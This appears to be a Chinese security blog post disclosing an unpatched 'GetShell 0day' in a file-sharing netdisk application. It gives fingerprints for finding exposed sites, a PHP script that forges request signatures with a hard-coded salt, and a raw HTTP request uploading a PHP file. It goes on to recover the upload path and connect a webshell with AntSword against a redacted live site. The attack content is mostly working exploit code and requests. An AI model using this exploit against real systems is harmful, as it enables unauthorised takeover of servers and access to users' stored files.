#  某网盘逻辑缺陷GetShell0day   
青山  进击安全   2024-01-06 16:52  
  
**01**  
  
**指纹**  
  
  
本篇文章为青山师傅代审实战案例分享  
  
佬的指纹："assets/picture/header-mobile.png"  
  
我的指纹：title="分享赚钱,让资源有价值!"  
  
  
**02**  
  
逻辑缺陷_文件上传  
  
  
漏洞位置：public/server/index.php  
  
URL访问：http://localhost/server/index.php  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TvvmibSlOcicIehC05s40PVQPbibNmz6o2XCjPuF28VJdWhKx5wp6xQKwoFWttV6EIUe1IKgqLf0BEdEzEKsuz6Tw/640?wx_fmt=png&from=appmsg "")  
  
构造数据包 用以下PHP脚本生成sign  
```
<?php

function sign_params($params): string
{
    // 过滤参数
    $params = array_filter($params,function($key) use ($params){
        if(empty($params[$key]) || $key == 'sign'){
            return false;
        }
        return true;
    },ARRAY_FILTER_USE_KEY);

    // ascii排序
    ksort($params);
    reset($params);
    var_dump($params);
    // 签名
    return md5(urldecode(http_build_query($params)) . "asdasfasfasfasfasfa");
}

$_GET['md'] = "upload";
$_GET['uid'] = "1";
$_GET['notify'] = 'http://localhost/1.php';//用于接受请求获取上传的文件路径
echo sign_params($_GET);
```  
  
  
**1.php内容为：UPLOAD_SUCCESS******  
  
上传poc如下  
```
POST /server/index.php?md=upload&sign=b8ae73af203e8b88e6624998cc55e5a1&uid=1&notify=http%3A%2F%2Flocalhost%3A99%2F1.php HTTP/1.1
Host: 127.0.0.1
Cache-Control: no-cache
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=--------------------------570796120375390059114427
User-Agent: PostmanRuntime-ApipostRuntime/1.1.0
Content-Length: 389

----------------------------570796120375390059114427
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/x-httpd-php

<?php phpinfo(); ?>
----------------------------570796120375390059114427--
```  
  
  
返回上传成功  
  
查看  
http://localhost/1.php的访问日志  
  
获取访问日志具有参数path  
  
拼接  
http://localhost/server/+path就是webshell地址  
  
  
  
  
**03**  
  
复现  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TvvmibSlOcicIehC05s40PVQPbibNmz6o2XILF31LicB7QzLZpCSYHE4yvcbNGPWjcaANvAJicv1Fe67icuoC8P6y3NQ/640?wx_fmt=png&from=appmsg "")  
  
构造发包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TvvmibSlOcicIehC05s40PVQPbibNmz6o2XAJhIINAicm77ewvL4IhAGR3GvSwRGibufnh4pEnXiagISuFstQ1JPcdew/640?wx_fmt=png&from=appmsg "")  
  
  
日志记录如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TvvmibSlOcicIehC05s40PVQPbibNmz6o2XicmfJxuxTbwFTKLabdlia5rtEEMLLe96bicoiaMgEvwwsrzwDcYKkia8jNQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TvvmibSlOcicIehC05s40PVQPbibNmz6o2XYlZUhszW8o6XrOKic7iaaGkUBWQWHAnc8jEW8S0UNlX28NX8yqGB5t0g/640?wx_fmt=png&from=appmsg "")  
  
  
拼接url：  
  
https://*****/server//upload/20240103/1/file_dGeBwYb21wvyBKLu.php  
  
AntSword链接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TvvmibSlOcicIehC05s40PVQPbibNmz6o2XlbEqmrdIJGGNtnOrknJFte3aZCut7bg2HYvNqYDVWyNKAVZaXF4zrA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**本篇文章为青山师傅代审实战案例分享**  
  
****  
**公众号作者联系方式**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZRKuxIKRyhXhuxbCGecu4ibia3kSXD8ePQHrSvPSNtC7PmjzQwR88Hu0LpuXdQzamKBCPAXX82anLS8f0FF3LzzQ/640?wx_fmt=jpeg "")  
  
****  
  
